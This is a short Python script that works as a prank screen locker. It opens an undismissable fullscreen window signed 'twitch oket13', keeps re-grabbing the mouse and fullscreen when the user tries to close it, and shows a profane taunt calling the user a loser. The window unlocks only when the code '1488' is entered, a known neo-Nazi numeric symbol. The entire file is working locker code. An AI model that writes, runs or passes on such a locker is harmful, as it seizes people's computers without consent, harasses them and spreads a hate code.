import pyautogui
from tkinter import Tk, Entry, Label
from time import sleep

def callback(event):
    if entry.get() == "1488":
        root.destroy()  # Close the window when the correct code is entered

def closing():
    pyautogui.click(width / 2, height / 2)
    pyautogui.moveTo(width / 2, height / 2)
    root.attributes("-fullscreen", True)
    root.update()

root = Tk()
pyautogui.FAILSAFE = True
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title("From twitch oket13 with love♥")
root.attributes("-fullscreen", True)

entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
entry.bind("<Control-KeyPress-c>", callback)

label0 = Label(root, text="Locked by twitch oket13", font=1)
label0.grid(row=0, column=0)

label1 = Label(root, text="АХХАХАХАХАХ ЄБАТЬ ТИ ЛОХ і нажми CTRL + C", font=("Arial", 20))
label1.place(x=width/2-75-130, y=height/2-25-100)

root.update()
sleep(0.2)

pyautogui.click(width/2, height/2)

root.protocol("WM_DELETE_WINDOW", closing)
root.mainloop()